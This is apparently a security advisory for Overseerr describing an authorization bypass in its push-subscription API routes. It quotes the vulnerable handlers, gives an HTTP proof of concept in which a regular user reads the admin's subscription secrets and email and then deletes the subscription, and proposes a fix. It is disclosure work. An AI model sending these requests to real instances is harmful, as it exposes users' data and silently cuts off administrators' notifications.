https://github.com/sct/overseerr - "This repository was archived by the owner on Feb 16, 2026. It is now read-only."

## Finding: Authenticated user can read and delete any other user's web push subscriptions (and leak their email) via /api/v1/user/{userId}/pushSubscription[s]

Package: overseerr (sct/overseerr)

Affected Versions: confirmed on v1.35.0 (sctx/overseerr:latest), HEAD 98ea135f, also present after the most recent webpush patch 21b188b0 (#4146) which only renamed :key to :endpoint and did not add an ownership check.

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N (5.4 Medium)

CWE: CWE-639 Authorization Bypass Through User-Controlled Key

### Summary
Three routes under /api/v1/user/{userId}/pushSubscription[s] are gated only by isAuthenticated() and never verify that the path userId matches the calling session. Any logged-in account with the default permissions=0 role can list, read, and delete any other user's push subscriptions, including the admin's. The JSON response also includes the full target user record, leaking email and plexId for every push-subscribed user despite User.filteredFields trying to strip those fields elsewhere.

### Details

server/routes/user/index.ts mounts the user router with only isAuthenticated():

```ts
// server/routes/index.ts:97
router.use('/user', isAuthenticated(), user);
```

server/routes/user/index.ts:186-257 then registers three handlers that pull req.params.userId straight into the where-clause:

```ts
router.get<{ userId: number }>(
  '/:userId/pushSubscriptions',
  async (req, res, next) => {
    const userPushSubRepository = getRepository(UserPushSubscription);
    const userPushSubs = await userPushSubRepository.find({
      relations: { user: true },
      where: { user: { id: req.params.userId } },
    });
    return res.status(200).json(userPushSubs);
    ...
  }
);

router.get<{ userId: number; endpoint: string }>(
  '/:userId/pushSubscription/:endpoint',
  async (req, res, next) => {
    ...
    const userPushSub = await userPushSubRepository.findOneOrFail({
      relations: { user: true },
      where: { user: { id: req.params.userId }, endpoint: req.params.endpoint },
    });
    return res.status(200).json(userPushSub);
    ...
  }
);

router.delete<{ userId: number; endpoint: string }>(
  '/:userId/pushSubscription/:endpoint',
  async (req, res, next) => {
    ...
    const userPushSub = await userPushSubRepository.findOneOrFail({
      relations: { user: true },
      where: { user: { id: req.params.userId }, endpoint: req.params.endpoint },
    });
    await userPushSubRepository.remove(userPushSub);
    return res.status(204).send();
    ...
  }
);
```

There is no ownership check. By contrast, the sibling usersettings.ts:18-19 implements the correct pattern that is missing here:

```ts
if (
  !req.user?.hasPermission(Permission.MANAGE_USERS) &&
  req.user?.id !== Number(req.params.id)
) {
  return next({ status: 403, message: "You do not have permission..." });
}
```

The response from the GET routes includes the full user via the relations: { user: true } join. The user record is returned without calling user.filter(), so static User.filteredFields = ['email', 'plexId'] (server/entity/User.ts:42) is bypassed and the caller obtains the target user's email and plexId.

The most recent patch in this area, 21b188b0 ("fix: better handling for active webpush subscription", #4146, Jun 12 2025), only swapped the path parameter from :key (p256dh) to :endpoint and added no ownership check. The vulnerability is current at HEAD 98ea135f.

### PoC

Prerequisites:
- A running overseerr instance (tested against sctx/overseerr:latest, version 1.35.0).
- Any two accounts: an admin and a regular user. We use admin (id=1, permissions=2) and bob (id=2, permissions=0).

Step 1: Bob logs in.

```
POST /api/v1/auth/local HTTP/1.1
Host: 127.0.0.1:9181
Content-Type: application/json

{"email":"bob@audit.test","password":"UserPass1!"}
```

Step 2: Admin registers a push subscription (could be the legitimate one created by their browser).

```
POST /api/v1/user/registerPushSubscription HTTP/1.1
Host: 127.0.0.1:9181
Cookie: connect.sid=<admin session>
Content-Type: application/json

{"endpoint":"https://fcm.googleapis.com/fcm/send/ADMIN_DEVICE_ABC123","p256dh":"BAdminP256dhKeyFAKE","auth":"ADMIN_AUTH_SECRET_KEY","userAgent":"Mozilla/5.0"}
```

Response: HTTP/1.1 204 No Content

Step 3: Control - bob tries the sibling settings endpoint, expected 403.

```
POST /api/v1/user/1/settings/main HTTP/1.1
Host: 127.0.0.1:9181
Cookie: connect.sid=<bob session>
Content-Type: application/json

{"displayName":"x"}
```

Response: HTTP/1.1 403 Forbidden {"message":"You do not have permission to view this user's settings."}

Step 4: Exploit 1 - bob dumps admin's push subscriptions.

```
GET /api/v1/user/1/pushSubscriptions HTTP/1.1
Host: 127.0.0.1:9181
Cookie: connect.sid=<bob session>
```

Response: HTTP/1.1 200 OK

```
[{
  "id": 2,
  "endpoint": "https://fcm.googleapis.com/fcm/send/ADMIN_DEVICE_ABC123",
  "p256dh": "BAdminP256dhKeyFAKE",
  "auth": "ADMIN_AUTH_SECRET_KEY",
  "userAgent": "Mozilla/5.0",
  "createdAt": "2026-05-26T13:48:04.000Z",
  "user": {
    "permissions": 2,
    "id": 1,
    "email": "admin@audit.test",
    "plexUsername": "admin",
    "username": "admin",
    "userType": 2,
    "plexId": null,
    ...
  }
}]
```

Note the leaked admin email and the response includes the auth secret used by the push provider to authenticate notifications.

Step 5: Exploit 2 - bob deletes admin's push subscription.

```
DELETE /api/v1/user/1/pushSubscription/https%3A%2F%2Ffcm.googleapis.com%2Ffcm%2Fsend%2FADMIN_DEVICE_ABC123 HTTP/1.1
Host: 127.0.0.1:9181
Cookie: connect.sid=<bob session>
```

Response: HTTP/1.1 204 No Content

Step 6: Confirmation - admin's subscriptions list is empty.

```
GET /api/v1/user/1/pushSubscriptions HTTP/1.1
Cookie: connect.sid=<admin session>
```

Response: HTTP/1.1 200 OK []

### Impact

Any authenticated user (default permissions=0) can:
- Enumerate the push subscriptions of any other user, including the admin.
- Read endpoint URLs, p256dh keys, and auth secrets for every subscription.
- Read the target user's email and plexId via the joined user relation. This is the same data that User.filteredFields tries to hide on /user/:id, /user/, and most other endpoints. The push subscription endpoint is the only path that returns User unfiltered.
- Permanently delete other users' push subscriptions, breaking their notification channel (request approvals, issue updates, server alerts) without alerting them.

Useful chain for a hostile lower-tier user:
1. Enumerate /api/v1/user/1/pushSubscriptions to learn admin's email and prove that admin uses Chrome on a specific device (FCM endpoint).
2. Delete the admin's push subscription so the admin stops receiving any approval-requested notifications.
3. File a request requiring approval; the admin no longer gets the push prompt and approval is delayed or comes by email only.

The fix is straightforward and follows the existing usersettings.ts pattern: at the top of each of the three handlers, return 403 if req.user.id !== Number(req.params.userId) and the caller lacks Permission.MANAGE_USERS. Additionally, .map(s => ({ ...s, user: s.user.filter() })) the response so email and plexId continue to be stripped.
